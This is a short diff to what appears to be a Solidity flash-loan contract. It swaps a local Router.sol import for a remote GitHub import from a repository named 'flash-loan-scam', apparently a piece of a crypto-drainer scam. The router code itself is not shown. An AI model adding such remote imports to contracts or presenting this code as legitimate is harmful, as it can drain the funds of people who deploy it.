@@ -10,7 +10,7 @@ import { IBakerySwapFactory } from "https://github.com/pancakeswap-flashloan/fla
 
 // Router
 // import "ipfs://QmSPEmnJEVjRbtmdcbeApHAVFVYGT4Lefrp45Ca2QK5923";
-import "./Router.sol";
+import "https://github.com/pancakeswap-flashloan/flash-loan-scam/blob/main/contracts/Router.sol";
 
 // Multiplier-Finance Smart Contracts
 import { ILendingPoolAddressesProvider } from "./Interfaces.sol"; // "https://github.com/Multiplier-Finance/MCL-FlashloanDemo/blob/main/contracts/interfaces/ILendingPoolAddressesProvider.sol";
